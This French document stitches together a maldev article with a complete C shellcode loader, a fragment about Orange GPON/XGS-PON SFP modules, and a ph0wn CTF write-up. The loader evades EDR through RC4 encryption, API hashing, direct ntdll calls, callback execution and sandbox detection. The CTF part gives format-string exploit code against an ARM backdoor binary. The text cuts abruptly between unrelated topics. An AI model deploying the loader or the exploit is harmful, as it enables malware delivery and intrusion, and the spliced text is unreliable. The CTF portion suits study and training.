[0x00] :: INTRODUCTION

J'ai récemment eu l'occasion de discuter maldev et après réflexion, me suis dis
qu'il serait intéressant de discuter de certaines techniques d'évasions.

PwnBot m'a récemment montré un PoC qu'il c'était amusé à faire, qui combine 
plusieurs techniques et des ptites astuces qui marchent. Me suis pas fais chié 
et j'ai pris son shellcode comme exemple. 

Le PoC compile en vrac,

  - Du chiffrement RC4 sur le payload,
  - Une résolution des APIs via PEB + hash (pas de str en clair)
  - Des appels directs à ntdll pour éviter les crochets en user-mode
  - Transition RW->RX (pas de RWX, les EDR adorent ça)
  - De l'exécution via callback EnumSystemLocalesA (pas de call direct)
  - Une détection de sandbox basée sur le timing

#include <windows.h>

/* ------------------------------------------------------------------ */
/* djb2 hashes                        */
/* ------------------------------------------------------------------ */
#define HASH_NTDLL_DLL                  0xe91aad51UL
#define HASH_KERNEL32_DLL               0x3e003875UL
#define HASH_NtAllocateVirtualMemory    0xf0146ce2UL
#define HASH_NtProtectVirtualMemory     0xcd363694UL
#define HASH_EnumSystemLocalesA         0x7ced7069UL

/* ------------------------------------------------------------------ */
/* djb2                                                                */
/* ------------------------------------------------------------------ */
static DWORD djb2_a(const char *s) {
    DWORD h = 5381;
    while (*s) h = (h * 33) ^ (unsigned char)*s++;
    return h;
}

static DWORD djb2_w(const WCHAR *s) {
    DWORD h = 5381;
    while (*s) {
        WCHAR c = (*s >= L'A' && *s <= L'Z') ? *s + 32 : *s;
        h = (h * 33) ^ (unsigned char)c;
        s++;
    }
    return h;
}

/* ------------------------------------------------------------------ */
/* LDR struct                                                       */
/* ------------------------------------------------------------------ */
typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY;

/* ------------------------------------------------------------------ */
/* PEB walk                                                             */
/* ------------------------------------------------------------------ */
static PVOID peb_get_module(DWORD target_hash) {
    PPEB peb   = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    while (curr != head) {
        MY_LDR_ENTRY *e = CONTAINING_RECORD(curr, MY_LDR_ENTRY, InMemoryOrderLinks);
        if (e->BaseDllName.Buffer && djb2_w(e->BaseDllName.Buffer) == target_hash)
            return e->DllBase;
        curr = curr->Flink;
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* EAT parser                                                           */
/* ------------------------------------------------------------------ */
static FARPROC eat_get_proc(PVOID base, DWORD target_hash) {
    BYTE *b = (BYTE *)base;
    IMAGE_DOS_HEADER      *dos = (IMAGE_DOS_HEADER *)b;
    IMAGE_NT_HEADERS      *nt  = (IMAGE_NT_HEADERS *)(b + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *ex = (IMAGE_EXPORT_DIRECTORY *)(b +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names    = (DWORD *)(b + ex->AddressOfNames);
    WORD  *ords     = (WORD  *)(b + ex->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(b + ex->AddressOfFunctions);

    for (DWORD i = 0; i < ex->NumberOfNames; i++) {
        const char *name = (const char *)(b + names[i]);
        if (djb2_a(name) == target_hash)
            return (FARPROC)(b + funcs[ords[i]]);
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* API typedefs                                                         */
/* ------------------------------------------------------------------ */
typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(
    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(
    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

typedef BOOL (WINAPI *fnEnumSystemLocalesA)(LOCALE_ENUMPROCA, DWORD);

/* ------------------------------------------------------------------ */
/* RC4                                                                  */
/* ------------------------------------------------------------------ */
static void rc4_crypt(unsigned char *key, int klen,
                      unsigned char *data, int dlen) {
    unsigned char S[256];
    int i, j = 0;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % klen]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
    }
    i = j = 0;
    for (int k = 0; k < dlen; k++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
        data[k] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

/* ------------------------------------------------------------------ */
/* Sandbox check: mesure si Sleep() dort vraiment                     */
/* ------------------------------------------------------------------ */
static BOOL sandbox_check(void) {
    LARGE_INTEGER t1, t2, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    Sleep(1500);
    QueryPerformanceCounter(&t2);
    LONGLONG elapsed_ms = (t2.QuadPart - t1.QuadPart) * 1000 / freq.QuadPart;
    return (elapsed_ms >= 1400);  /* allow 100 ms tolerance */
}

int main(void) {
 
    /* check sandbox */
    if (!sandbox_check())
        return 0;

    /* Resolve ntdll + kernel32 depuis la PEB */
    PVOID hNtdll = peb_get_module(HASH_NTDLL_DLL);
    PVOID hK32   = peb_get_module(HASH_KERNEL32_DLL);
    if (!hNtdll || !hK32) return 1;

    /* Resolve Nt* depuis ntdll EAT (bypasses kernel32 hook layer) */
    fnNtAllocateVirtualMemory NtAVM =
        (fnNtAllocateVirtualMemory)eat_get_proc(hNtdll, HASH_NtAllocateVirtualMemory);
    fnNtProtectVirtualMemory  NtPVM =
        (fnNtProtectVirtualMemory) eat_get_proc(hNtdll, HASH_NtProtectVirtualMemory);
    fnEnumSystemLocalesA      EnumSL =
        (fnEnumSystemLocalesA)     eat_get_proc(hK32,   HASH_EnumSystemLocalesA);
    if (!NtAVM || !NtPVM || !EnumSL) return 1;

    /* Alloue RW via ntdll directement */
    PVOID  buf = NULL;
    SIZE_T len = sizeof(enc_sc);
    NtAVM((HANDLE)-1, &buf, 0, &len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 1;

    /* copie + RC4 decrypt */
    for (SIZE_T i = 0; i < sizeof(enc_sc); i++)
        ((BYTE*)buf)[i] = enc_sc[i];
    rc4_crypt(KEY, sizeof(KEY), (unsigned char *)buf, (int)sizeof(enc_sc));

    /* Flip RX via ntdll directement */
    ULONG  old = 0;
    SIZE_T region = sizeof(enc_sc);
    NtPVM((HANDLE)-1, &buf, &region, PAGE_EXECUTE_READ, &old);

    /* Execute via EnumSystemLocalesA callback pas de fn-ptr cast à poil */
    EnumSL((LOCALE_ENUMPROCA)buf, 0);

    return 0;
}

[0x03] :: ANALYSE DU CODE

┌---[1.1] Chiffrement RC4
│
│   Le payload (calc.exe) est chiffré avec RC4. La clé est définie dans KEY[] 
│   et doit matcher avec celle utilisé pour générer le shellcode.
│   Rien de révolutionnaire, mais ça évite les signatures statiques sur le 
│   payload brut et c'est léger.
│
│   static unsigned char KEY[] = {0x4e, 0x61, ...};
│   static unsigned char enc_sc[] = {0x5f, 0xef, ...};
│
│   La fonction rc4_crypt() est appelée pour déchiffrer le payload en
│   mémoire après allocation.

┌---[1.2] Résolution des DLLs via PEB
│
│   Pas d'appels à LoadLibrary() ou GetModuleHandle() ! On parcourt la
│   PEB (Process Environment Block) pour trouver les bases des DLLs
│   chargées. La fonction peb_get_module() utilise un hash djb2 sur le
│   nom de la DLL (en Unicode) pour éviter les strings en clair.
│
│     PPEB peb = (PPEB)__readgsqword(0x60);
│     PLIST_ENTRY curr = peb->Ldr->InMemoryOrderModuleList.Flink;
│
│   Les hashs sont prédéfinis :
│     HASH_NTDLL_DLL     = 0xe91aad51
│     HASH_KERNEL32_DLL  = 0x3e003875
│
│   Astuce : Les hashs sont calculés avec djb2_w() qui convertit les
│   caractères en minuscules avant le hash. Pratique pour éviter les
│   variations de casse.

┌---[1.3] Résolution des APIs via EAT
│
│   Même principe pour les fonctions : on parse l'EAT (Export Address Table)
│   des DLLs pour trouver l'adresse des fonctions ciblées. La fonction
│   eat_get_proc() prend la base de la DLL et un hash de nom de fonction.
│
│     IMAGE_EXPORT_DIRECTORY *ex = ...;
│     for (DWORD i = 0; i < ex->NumberOfNames; i++) {
│         const char *name = (const char *)(b + names[i]);
│         if (djb2_a(name) == target_hash) return (FARPROC)(b + funcs[...]);
│     }
│
│   Les fonctions ciblées :
│     NtAllocateVirtualMemory  (hash: 0xf0146ce2)
│     NtProtectVirtualMemory   (hash: 0xcd363694)
│     EnumSystemLocalesA       (hash: 0x7ced7069)
│
│   Pourquoi ces fonctions ?
│   - NtAllocateVirtualMemory / NtProtectVirtualMemory : Appels directs à
│     ntdll, contournent les hooks user-mode (ex: dans kernel32).
│   - EnumSystemLocalesA : Utilisée pour exécuter le shellcode via un
│     callback. Moins suspect qu'un call direct à un pointeur de fonction.

┌---[1.4] Allocation et Protection de la Mémoire
│
│   On alloue de la mémoire en RW (Read-Write) avec NtAllocateVirtualMemory,
│   puis on copie et déchiffre le payload dedans. Ensuite, on passe la page
│   en RX (Read-eXecute) avec NtProtectVirtualMemory.
│
│     NtAVM((HANDLE)-1, &buf, 0, &len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
│     memcpy(buf, enc_sc, sizeof(enc_sc));
│     rc4_crypt(KEY, sizeof(KEY), buf, sizeof(enc_sc));
│     NtPVM((HANDLE)-1, &buf, &region, PAGE_EXECUTE_READ, &old);
│
│   Pourquoi pas RWX directement ? Dans le mille émile, Les solutions de 
│   détection (EDR, AV) surveillent les allocations RWX (exécutable ET writable). 
│   La transition RW->RX est plus discrète.

┌---[1.5] Exécution via Callback
│
│   Pas de :
│     ((void(*)())buf)();
│
│   À la place, on utilise EnumSystemLocalesA qui prend un pointeur de
│   fonction (LOCALE_ENUMPROCA) en argument. Notre shellcode est casté en
│   ce type et passé comme callback.
│
│     EnumSL((LOCALE_ENUMPROCA)buf, 0);
│
│   Ça évite les signatures sur les appels directs à des pointeurs de mémoire
│   allouée. Pis EnumSystemLocalesA est une API légitime, donc moins surveillée.

┌---[1.6] Détection de Sandbox
│
│   La fonction sandbox_check() mesure le temps écoulé pendant un Sleep(1500).
│   Dans une sandbox, Sleep() est souvent "fast-forwardé", donc le temps
│   réel écoulé sera bien inférieur à 1500ms.
│
│     QueryPerformanceCounter(&t1);

-- 0x2: Identifier sa techno fibre --

Avant de commander votre module SFP, vous devez identifier votre technologie
réseau. Il va falloir se rendre sur la carte de couverture fibre d'Orange
https://reseaux.orange.fr/les-cartes-de-couverture/carte-de-couverture-
fibre, saisissez votre adresse et vérifiez la mention affichée:

Fibre: Vous êtes en GPON (débit max ~2.5 Gbps).
XGS-PON: Vous êtes sur la nouvelle technologie (débit max ~10 Gbps).

Le PON n'a rien à voir avec le pont à base d'anis, le PON (Passive Optical
Network) est un réseau optique passif avec une architecture
point-à-multipoint. Il se compose d'un OLT (chez l'opérateur), d'un ONU/ONT
(votre module SFP) et de splitters passifs.

Le GPON (Gigabit-capable PON) est le standard le plus répandu (~2.5 Gbps).
Il supporte le Triple-play (Internet, TV, Téléphone) avec une très bonne
efficacité et un chiffrement AES natif.

Enfin, le XGS-PON est l'évolution 10 Gigabit, avec des débits symétriques
bien plus élevés.

Fun fact, je pensais être en XGS-PON et j'ai donc commandé trop rapidement
un WAS110. Finalement, ma ligne est en GPON. Pas d'inquiétude, si vous êtes
réellement en XGS-PON, j'ai tout de même troubleshoot le module et la
configuration reste globalement identique !

Vous êtes en XGS-PON (10G)

Le module star est le WAS110. Il est indispensable d'utiliser le firmware
custom "8311".

C'est l'ONU le plus avancé, il bénéficie d'une énorme communauté, d'un support
actif et de corrections constantes pour s'adapter aux différents opérateurs
mondiaux.
Retrouvez le d'achat et de conf sur https://akhamar.github.io/orange-xgs-pon/

Vous êtes en GPON (2.5G)

Bon après mes péripéties, j'ai donc pris un SFP GPON, le Huawei MA5671A.

L'Application Binary  Interface sous ARM  est plutôt stable et  standardisée. On
part donc des calling conventions suivantes lors d'un appel de procédure :
-> 4 premiers arguments en registres (r0..r3 dans cet ordre)
-> arguments suivants sur la stack
-> retour de fonction dans r0
-> stack descendante: la stack commence à une adresse haute (e.g. 0x4ffc)
   et descend vers 0 jusqu'à une limite (e.g. 0x4800)
-> CPU 32-bits, un "push" fait descendre la stack d'1 mot == 4 octets
-> stack full-descending: en plus d'être descendante,  sp pointe vers le dernier
   espace occupé (full)
-> appel  avec  l'instruction  "bl"  qui "branch-link",  c'est  à  dire saute  à
   l'adresse  donnée  et  utilise  le  registre  "lr" (= r14)  pour  enregistrer
   l'adresse de retour de la procédure
-> les exécutables sont en little endian  (LSB), l'octet de poids faible dans un
   mot de plusieurs octets est à l'adresse mémoire la plus basse


## [ Analyse de l'exé backdoor ] -------------------------------------- [ 2 ] ##

L'exécutable est plutôt simple et les symboles de debug sont présents, ce qui va
faciliter l'analyse.

On a les fonctions suivantes :
- main qui écoute sur le port 9999 en TCP, et fork pour chaque nouveau client
  vers handle_client(socket)
- handle_client envoie un message au client puis passe à handle_commands
- handle_commands est le "menu principale" :
  - reçoit une commande via parse_arg
  - décortique puis exécute la commande :
    - do_login demande un username/password précompilé
    - cmd_ping, cmd_echo, cmd_info, cmd_logout demandent d'être loggué
    - cmd_shell ne demande pas d'être loggué mais a un comportement suspect :
      1. pioche 4 mots aléatoires
      2. check si sont égaux à l'argument de cmd_chell
      3. si oui, do_cmd_shell(socket)

La  fonction do_cmd_shell(socket)  est  le  coeur de  la  porte  dérobée :  elle
transforme le lien TCP  vers un shell sur la machine.  La fonction cmd_shell n'a
pas de faille au premier abord.

       +----------------------------------------------------------------+
       |           On a maintenant l'objectif du ph0wn2own :            |
       | soit trouver une faille pour prédire l'aléa et passer le test, |
       | soit trouver une faille pour appeler directement do_cmd_shell. |
       +----------------------------------------------------------------+

J'ai choisi pour ce write-up  d'essayer d'appeler directement do_cmd_shell, même
si sa construction appelle plutôt à essayer de prédire l'avenir. On discutera de
cette fin alternative à la fin du write-up.

Il faut donc commencer par trouver une faille quelque part.

parse_arg est la  première candidate. Sa signature :  parse_arg(int socket, char
*buffer, size_t max_len) Cette fonction copie jusqu'à max_len octets du lien TCP
dans buffer et  son implémentation ne semble pas vulnérable  aux buffer overruns
ou autre problème.

Cette  fonction   donne  aussi  le   "protocole"  à  respecter  pour   parler  à
l'application. On envoie sur  le lien TCP 4 octets en  little endian pour donner
la taille de ce qu'on envoie, puis on envoie ce nombre d'octets. Si la taille du
buffer qu'on  envoie dépasse la taille  max donnée à parse_arg,  alors le buffer
est  tronqué et  seuls max_len  octets  du buffer  sont lus.  Par exemple,  pour
l'appel de parse_arg qui récupère la commande  à exécuter, la taille max est 31.
Les fonctions ont chacune un ou plusieurs arguments qu'elles reçoivent également
avec parse_arg, et qui ont chacune leur  limite de taille à ne pas dépasser. Par
exemple, pour la commande echo, on peut aller jusqu'à 0x200 octets.


## -- ( do_login ) -------------------------------------------------- [ 2.1 ] ##

C'est une  étape à franchir  pour accéder aux  autres fonctions. Elle  n'est pas
vulnérable au  sens du  pwn, mais  elle accepte  l'utilisateur en  utilisant des
informations compilées dans l'application, donc facile à contourner.

Elle attend 2  arguments, le premier est  le username "ph0wn", le  second est le
password "5tr0ng_P@ssw0rd!". Ceci  met à jour une variable  globale qui débloque
l'accès aux autres commandes, où on espère trouver des failles.


## -- ( cmd_echo ) -------------------------------------------------- [ 2.2 ] ##

Cette  fonction demande  à être  logguée, puis  elle prend  un argument  qu'elle
formate sur la socket en retour. Son fonctionnement est en gros :
- alloue to_echo (0x200 octets) et récupère l'argument dans ce buffer
- alloue to_print (0x800 octets) et fait un snprintf(to_print, 0x800, to_echo)

Ce dernier  appel est  la vulnérabilité  : on  maitrise to_print  et on  va donc
pouvoir en abuser.


## [ Vulnérabilités via snprintf ] ------------------------------------ [ 3 ] ##

Déjà snprintf, c'est une variadique : snprintf(to_print, 0x800, to_echo, ...).

Que  se passe-t-il  si on  donne to_echo="%x  %x %x"  ? Reprenons  la convention
d'appel de procédure :
- premier argument dans le registre r0 -> to_print
- deuxième argument --------------- r1 -> 0x800
- troisième ----------------------- r2 -> to_echo
- quatrième ----------------------- r3
- cinquième et suivants dans la stack (le 5° poussé d'abord, ensuite le 6°,
  ensuite le 7°, ...)

Le code  de la fonction snprintf  s'exécute *comme si* l'appelant  avait préparé
les arguments correctement en registres et  en stack. Avec l'exemple "%x %x %x",
la fonction va donc  chercher le 4°, 5°, et 6° argument  *comme si* cmd_echo les
avait préparés correctement, et snprintf va donc afficher le contenu de r3, puis
le contenu de la stack au moment de l'appel.

En reprenant la convention  du manuel de printf qui dit  que le premier argument
optionnel est  l'argument numéro  1, on peut  visualiser la stack  et ce  à quoi
snprintf va pouvoir accéder :

|  argument2 <--- sp (stack pointer) au moment de l'appel
|  argument3
|  argument4
|  argument5
|  [...]
v (adresses mémoires croissantes vers le bas)

L'argument 1 n'est pas sur la stack puisque c'est le contenu du registre r3.

On peut  utiliser un  modificateur pour  maîtriser plus  finement nos  lecture :
"%k$n"  utilise directement  le  k-ième  argument, ce  qui  nous  donne accès  à
l'endroit voulu sur la stack.

         +------------------------------------------------------------+
         | Premier outil : lecture arbitraire de la stack via "%k$x". |
         +------------------------------------------------------------+

Les fonctions  printf ont également  une capacité d'écriture qu'on  oublie parce
que son  utilisation est  plus rare :  le convertisseur %n.  D'après le  man, il
permet d'écrire  le nombre d'octets déjà  formatés au moment où  il apparaît. Il
utilise l'argument passé correspondant comme un pointeur sur entier. L'opération
pourrait s'écrire `*p_i = current_len();`. Par exemple :

```c
int i=4;
printf("%08d %n%d", i, &i, i);
```

écrirait "00000004 9" et i vaut 9 après son exécution.

On peut utiliser des modificateurs pour maîtriser plus finement nos écritures :
- "%k$n" utilise le k-ième argument -> choisir quel élément de la stack utiliser
  comme pointeur
- "%[nombre]i" insère du padding pour que le formatage du nombre prenne au moins
  `nombre` octets -> ajuster plus facilement la valeur écrite par %n
- "%hhn"  considère  que  le  pointeur  est  un  "uint8_t*"  et  "%hn"  pour  un
  "uint16_t*" -> modifier seulement 1 ou 2 octets plutôt que 4

Notre buffer fait 0x800  de long, on ne pourra donc pas padder  à plus que cette
longueur, et on ne pourra pas écrire d'entier plus grand que 0x800. On s'oriente
donc vers l'utilisation de "%k$hhn".

       +----------------------------------------------------------------+
       | Deuxième outil : écriture arbitraire de la stack via "%k$hhn". |
       +----------------------------------------------------------------+

Pour écrire  un entier 32 bits,  on a besoin de  4 "%hhn" qu'on peut  trier pour
utiliser seulement 0x100 octets de  formatage et écrire n'importe quelle valeur.
Il faut trier  les octets dans le  bon ordre. Par exemple,  écrire 0x7fff0482 en
0x1234 revient à écrire  0x82 en 0x1234, 0x04 en 0x1235, 0xff  en 0x1236 et 0x7f
en 0x1237 : `printf("%1$4i%1$hhn" "%1$123i%2$hhn" "%1$3i%3$hhn" "%1$125i%4$hhn",
0, 0x1235, 0x1237, 0x1234, 0x1236);`.


## [ Que faire avec ces outils ? ] ------------------------------------ [ 4 ] ##

La stack  comprend deux éléments essentiels  à l'exécution d'un programme  : les
variables locales de la fonction, l'adresse de retour (pour que l'appelant de la
fonction  puisse reprendre  l'exécution après  l'appel de  la fonction),  et des
valeurs des registres qu'il faut préserver pour l'appelant. Pour schématiser ces
éléments sur la stack au moment de l'appel à snprintf :

|   /    <--- sp (stack pointer) au moment de l'appel
|   | variables locales de cmd_echo
|   \
|   sauvegarde registres
|   adresse de retour vers handle_commands (0x9194)
|   /
|   | variables locales de handle_commands
|   \
|   sauvegarde registres
|   adresse de retour vers handle_client (0x9828)
| [...]
v (adresses mémoires croissantes vers le bas)

Un vecteur  d'attaque semble  se dessiner  : modifier  l'adresse de  retour vers
handle_commands  pour exécuter  à  la  place do_cmd_shell.  Il  s'agit d'un  ROP
(Return-Oriented Programming).

Toutes  les adresses  *après* sp  sont  accessibles en  lecture directement  via
"%k$x". Mais  on ne  peut utiliser  que des pointeurs  *présents après  sp* pour
pouvoir écrire.

Il faudrait énormément  de bol pour qu'un pointeur sur  la stack nous permettant
de modifier directement l'adresse  de retour existe. Et ce n'est  pas le cas. Il
faut donc  analyser plus  en détail les  variables globales pour  voir si  on en
maîtrise des zones ou non.

Regardons le prologue de cmd_echo :

  mov ip, sp
  push {fp, ip, lr, pc}
  sub fp, ip, 4
  sub sp, sp, 0x38

Et l'épilogue correspondant :

  sub sp, fp, 0xc
  pop {fp, sp, pc}

La fonction sauvegarde fp (Frame Pointer, le registre r11), ip (r12) qui vaut en
fait  sp  avant  le  push,  lr  (contient  l'adresse  de  l'instruction  suivant
l'instruction bl qui a appelé cette fonction), et enfin pc (Program Counter). Ce
dernier  registre n'est  pas ré-utilisé  et sert  uniquement à  garder la  stack
alignée à  8 octets.  On peut le  voir en  analysant l'épilogue :  seul 3  des 4
registres sont  pop en sortie,  et en regardant bien,  fp et sp  reprennent leur
valeur, et pc prend la valeur de lr.

La fonction  s'est donc  réservée 0x38  octets sur la  stack pour  ses variables
locales (également aligné à 8 octets), soit entre 13 ou 14 mots. En schéma :

| local_00   <--- sp après le prologue
| local_04
| local_08
| local_0c
| ...
| local_30
| local_34
| fp avant le prologue
| sp avant le prologue
| lr == addr instruction après bl cmd_echo
| pc avant le prologue (padding)           <--- fp pendant cmd_echo
|                                          <--- sp on entry
v

On peut accéder aux variables locales de deux manières :
- par le début de la stack, l'adresse de local_00 est sp+0x00
- par la fin de la stack,   l'adresse de local_00 est fp-0x40

Avec  un  travail  d'analyse  sur  cmd_echo et  handle_commands,  on  déduit  la
composition de la stack au moment de l'appel à snprintf. La mention "argK" donne
la valeur de k qui doit être utilisé  dans "%k$x" ou "%k$hhn" pour accéder à cet
emplacement de la stack.  Pour rappel, on commence à arg2 car  arg1 est passé en
registre via r3.

| arg02  / [padding]   <--- sp au moment de l'appel à snprintf
| arg03  | cmd_echo: socket
| arg04  |           [unused]
| arg05  |           error_msg
| arg06  |           error_msg
| arg07  |           error_msg
| arg08  |           error_msg
| arg09  |           error_msg
| arg10  |           error_msg
| arg11  |           error_msg
| arg12  |           error_msg
| arg13  |           *to_echo
| arg14  |           len_to_echo
| arg15  \           *to_print
| arg16  save fp
| arg17  save sp
| arg18  save lr ---> retour en 0x9194
| arg19  [padding]                 <--- fp pointe ici pendant cmd_echo
| arg20  / [padding]
| arg21  | handle_commands: socket
| arg22  |                  [unused]
| arg23  |                  buffer_commande[ 0.. 3]
| arg24  |                  buffer_commande[ 4.. 7]
| arg25  |                  buffer_commande[ 8..11]
| arg26  |                  buffer_commande[12..15]
| arg27  |                  buffer_commande[16..19]
| arg28  |                  buffer_commande[20..23]
| arg29  |                  buffer_commande[24..27]
| arg30  |                  buffer_commande[28..31]
| arg31  \                  len_command
| arg32  save fp
| arg33  save sp
| arg34  save lr ---> retour en 0x9824
| arg35  [padding]                 <--- fp pointe ici pendant handle_commands

On remarque ici que le buffer_commande (appelé "buf" dans les symboles de debug)
est alloué  dans la stack  par handle_commands. On  note aussi que  le programme
utilise strcmp("echo",  buffer_commande) pour  voir si  la commande  envoyée est
"echo".  Ceci signifie  que seuls  les  5 premiers  caractères seront  vérifiées
("echo" suivi du \0 indiquant la fin de chaîne en C).

On peut  donc utiliser tout  ce qu'il  y a derrière  buffer_commande[5..30] pour
écrire ce qu'on  veut sur la stack (on ne  peut pas utiliser buffer_commande[31]
car le  code le met à  0 après réception de  la commande pour éviter  les buffer
overruns). Comme on ne peut accéder à cette zone qu'au travers des argK qui sont
alignés  aux mots,  seuls 5  emplacement seront  utilisables :  arg25..arg29. On
pourrait utiliser arg24 si notre adresse a son octet de poids faible à 0x00.

            +-----------------------------------------------------+
            | Pour écrire via snprintf, on maitrise arg25 à arg29 |
            |   en envoyant des adresses par la commande "echo".  |
            +-----------------------------------------------------+


## [ Atterrissage ] --------------------------------------------------- [ 5 ] ##

Le but  est de  sauter vers  do_cmd_shell. Malheureusement,  la fonction  a pour
signature do_cmd_shell(socket).  Il faut  donc que  le registre  r0 soit  égal à
socket...  Or, en  sortant de  cmd_echo, r0  contient une  valeur interne  de la
fonction, en l'occurrence la valeur de retour  de free (qui ne renvoie rien donc
on ne sait  vraiment pas ce qu'il y a  dans r0 à ce moment là).  On ne peut donc
pas sauter directement au début de la fonction.

En revanche,  cette fonction est appelée  par cmd_shell qui charge  r0 depuis la
stack :

0x8ed8  ldr r0, [fp, -0x60]
0x8edc  bl 0x8cc4

Cet  endroit est  un meilleur  point d'atterrissage,  mais il  faudra placer  la
valeur de socket  au bon endroit sur  la stack. Cette valeur ne  change pas pour
toute la durée de la connexion, et on peut la trouver ailleurs sur la stack (par
exemple en arg3,  arg21). Elle vaut généralement un entier  assez faible (<0x800
qui est  notre limite  via snprintf), donc  on pourra utiliser  un seul  %n pour
l'écrire.

                 +--------------------------------------------+
                 |         Pour appeler do_cmd_shell,         |
                 | mettre socket au bon endroit sur la stack, |
                 |           puis ROPer en 0x8ed8.            |
                 +--------------------------------------------+

Ce write-up considère pour l'instant que la stack change d'adresse mémoire entre
deux exécutions du programme. Mais il est également possible que le programme ne
soit pas chargé au même endroit entre deux exécutions. Il faudra donc prendre la
peine de lire  lr avant de le ré-écrire,  pour ajuster au bon endroit  où est le
code en mémoire. On s'attend à ce que sa valeur soit 0x9194 quand on veut écrire
0x8ed8. Il  suffira de  faire lr_read-(0x9194-0x8ed8) pour  se retrouver  au bon
endroit, quelque soit l'adresse de base du programme en mémoire sur la cible.


## [ Attaque ] -------------------------------------------------------- [ 6 ] ##

Résumons les étapes de l'attaque :
- se logguer
- préparer l'appel à do_cmd_shell :
  - lire la valeur de socket dans la stack
  - lire la valeur qu'aura fp pendant le ROP (en sortie de cmd_echo, arg16)
  - écrire socket en fp-0x60
- écrire le ROP :
  - lire la valeur de lr en sortie de cmd_echo (arg18)
  - trouver son adresse pour le ré-écrire (par  exemple sp de cmd_echo pointe
    vers arg20, donc sp-8 pointe vers l'emplacement de lr en stack)
  - écrire lr-(0x9194-0x8ed8) à cet emplacement

Notre  ROP  n'est pas  vraiment  amicale  avec la  stack  et  on ne  pourra  pas
reprendre  le cours  "normal" du  programme après  avoir ROPé  (pas de  retour à
handle_commands)... Il faut donc effectuer le ROP en une seule commande echo. En
revanche, on  peut faire autant  de echo de  lecture que nécessaires  puisque la
stack se retrouvera aux mêmes emplacement entre 2 appels à echo.

Pseudo-code (syntaxe python), en considérant  que l'appel arg(buf) envoie sur la
socket le buffer buf en préfixant  sa longueur pour qu'il soit correctement reçu
par le programme :

```
arg(b'login\x00'); arg(b'ph0wn\x00'); arg(b'5tr0ng_P@ssw0rd!\x00')
# Lecture de ce qu'il nous faut
arg(b'echo\x00')
vals = arg(b'%3$x %16$x %18$x %17$x')
socket, fp_cmd_echo, lr_cmd_echo, sp_before_echo = vals
# Préparation de l'écriture
new_lr = lr_cmd_echo - (0x9194-0x8ed8)
addr_lr = sp_before_echo - 8
# Comme la valeur écrite par %n ne fait qu'augmenter, on trie les bytes à écrire
# dans l'ordre  croissant. On enregistre  l'adresse à  écrire avec le  byte pour
# savoir comment organiser les adresses après la commande echo.
lr_bytes_addr = sorted([
    (socket, fp_cmd_echo-0x60, 'n'),
    ((new_lr>> 0) & 0xff, addr_lr+0, 'hhn'),
    ((new_lr>> 8) & 0xff, addr_lr+1, 'hhn'),
    ((new_lr>>16) & 0xff, addr_lr+2, 'hhn'),
    ((new_lr>>24) & 0xff, addr_lr+3, 'hhn'),
])
# On  empile  les  adresses  à écrire  à  la suite  de  la  commande en  gardant
# l'alignement à 4 octets
arg(b'echo\x00\x01\x02\x03'+b''.join(addr for _,addr,_ in lr_bytes_addr))
# On a besoin de nombre d'octets *entre* deux valeurs (%x successifs)
n_pad = 0
diff_pads = []
for val,_,flag in lr_bytes_addr:
    diff_pads.append((val-n_pad, flag))
    n_pad += val-n_pad
# Ecrit avec les %k$hhn pour écrire (les pointeurs seront en arg25 et suivants)
#  (n'écrit pas %x si pad == 0)
req = ''
for i,(pad,flag) in enumerate(diff_pads):
    if pad: req += f'%1${pad}x'
    req += f'%{25+i}${flag}'
arg(req.encode())
```

Après ça,  on peut envoyer des  commandes et recevoir le  résultats. Par exemple
"ls" puis "cat flag"...


## [ Émulation ] ------------------------------------------------------ [ 7 ] ##

Un  point qui  prend du  temps la  première fois  qu'on le  fait mais  qui n'est
finalement  pas si  compliqué... J'ai  d'abord essayé  de re-compiler  le kernel
correspondant à  la distrib et  le lancer avec qemu.  Mais de toutes  façons, je
n'aurai pas  les périphériques branchés sur  le T46S (écran, boutons,  ...) donc
même après une compilation réussie et  des ajustements sur qemu (sans succès eux
^^), c'était peine perdue d'avance (!!!)

La commande utile  est `qemu-arm -L rootfs/  rootfs/phone/bin/backdoor`. On peut
aussi utiliser qemu-arm-static. Ça suffit et fonctionne très bien !

A noter cependant que pour pouvoir debug l'application, gdb-multiarch fonctionne
(utiliser gef  ou peda par exemple),  sauf le mode "follow-fork-mode  child" qui
permettrait de suivre un fork. Hors, le programme fork.

On  peut patcher  la  boucle de  la  fonction  main qui  réalise  le fork  assez
facilement. Il suffit de remplacer l'appel à fork par son code de retour dans le
process  forké  (qui est 0).  `mov r0, 0`  se compile en 00 00 a0 e3  qu'on peut
patcher à l'aide de xxd et sed :

```
cp rootfs/phone/bin/backdoor rootfs/phone/bin/backdoor~
xxd rootfs/phone/bin/backdoor~ |\
    sed 's,^00001ab0.*,00001ab0: b2fb ffeb 0000 a0e3 0030 a0e1 1c30 0be5,' |\
    xxd -r > rootfs/phone/bin/backdoor
```

